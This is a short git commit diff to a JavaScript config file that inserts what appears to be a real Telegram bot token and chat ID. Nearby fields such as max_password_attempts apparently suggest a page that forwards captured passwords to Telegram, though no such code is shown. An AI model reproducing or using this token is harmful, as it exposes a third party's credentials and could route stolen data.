3c3fd9cc9d1fb372eb4dbbad4d4f94b522c05788
boi10ty <phaxoay1@gmail.com>
2025-09-08 13:29:52 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,6 +1,6 @@
 const config = {
-    token: '',
-    chat_id: '',
+    token: '8086831835:AAGp7bTGis_7WFTrDtIrzZI03_SOt-bUj2w',
+    chat_id: '1922578871',
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 2,
